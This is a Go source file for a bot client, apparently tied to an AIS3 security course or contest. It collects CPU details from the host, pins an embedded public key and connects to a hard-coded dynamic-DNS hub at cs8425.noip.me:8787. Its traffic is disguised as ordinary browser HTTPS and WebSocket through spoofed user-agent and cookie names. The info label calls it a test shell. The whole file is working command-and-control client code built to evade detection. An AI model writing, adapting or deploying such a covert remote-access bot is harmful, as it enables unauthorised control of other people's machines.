//go build -ldflags="-s -w" -tags="extra mod" -o bot-all bot.go
package main

import (
	"encoding/base64"
	"runtime"
	"strings"
	"net"
	"fmt"

	"lib/fakehttp"
	kit "local/toolkit"
	"local/base"
)


var hubPubKey, _ = base64.StdEncoding.DecodeString("MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArogYEOHItjtm0wJOX+hSHjGTIPUsRo/TyLGYxWVk79pNWAhCSvH9nfvpx0skefcL/Nd++Qb/zb3c+o7ZI4zbMKZJLim3yaN8IDlgrjKG7wmjB5r49++LrvRzjIJCAoeFog2PfEn3qlQ+PA26TqLsbPNZi9nsaHlwTOqGljg82g23Zqj1o5JfitJvVlRLmhPqc8kO+4Dvf08MdVS6vBGZjzWFmGx9k3rrDoi7tem22MflFnOQhgLJ4/sbd4Y71ok98ChrQhb6SzZKVWN5v7VCuKqhFLmhZuK0z0f/xkBNcMeCplVLhs/gLIU3HBmvbBSYhmN4dDL19cAv1MkQ6lb1dwIDAQAB")
var hubAddr string = "cs8425.noip.me:8787"

var proc int = runtime.NumCPU() + 2

const (
	fakeHttp = true
	tls = true
	wsObf = true

	targetUrl = "/"
	tokenCookieA = "cna"
	tokenCookieB = "_tb_token_"
	tokenCookieC = "_cna"
	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36"
)

func initBot(c *base.Client) {
	c.Info.Set("NumCPU", fmt.Sprintf("%v", runtime.NumCPU()))

	lines, _ := kit.ReadLines("/proc/cpuinfo")
	for _, line := range lines {
		fields := strings.Split(line, ":")
		if len(fields) < 2 {
			continue
		}
		key := strings.TrimSpace(fields[0])
		value := strings.TrimSpace(fields[1])

		switch key {

		case "model name", "Hardware":
			// ARM : Hardware = Qualcomm Technologies, Inc MSM8939
			// x86: model name = Intel(R) Core(TM) i7-4710HQ CPU @ 2.50GHz
			c.Info.Set("ModelName", value)
		case "flags":
			flist := strings.FieldsFunc(value, func(r rune) bool {
				return r == ',' || r == ' '
			})
			c.Info.Set("flags", strings.Join(flist, ","))


		case "vendorId", "vendor_id", "Processor": // x86, x86, arm
			// ARM : ARMv7 Processor rev 1 (v7l)
			c.Info.Set("VendorID", value)
		}
	}
}

func main() {

	base.RegInit(initBot)

	c := base.NewClientM()
	c.UUID = kit.HashBytes256([]byte("AIS3 TEST BOT"))
//	c.AgentTag = "AIS3 TEST BOT"
//	c.HubKeyTag = "HELLO"
	c.HubPubKey = hubPubKey
	c.Daemon = false
	c.AutoClean = true
	c.Info.Set("AIS3", "test shell XD")
//	c.Info.Set("AIS3-2", "test2")

	c.Proc = proc

	if fakeHttp {
		mkFn := func(addr string) (*fakehttp.Client) {
			var cl *fakehttp.Client
			if tls {
				cl = fakehttp.NewTLSClient(addr, nil, true)
			} else {
				cl = fakehttp.NewClient(addr)
			}
			cl.TokenCookieA = tokenCookieA
			cl.TokenCookieB = tokenCookieB
			cl.TokenCookieC = tokenCookieC
			cl.UseWs = wsObf
			cl.UserAgent = userAgent
			cl.Url = targetUrl
			return cl
		}
		c.Dial = func(addr string) (net.Conn, error) {
			cl := mkFn(addr)
//			cl.Host = addr
			return cl.Dial()
		}
	}

	c.Start(hubAddr)

}


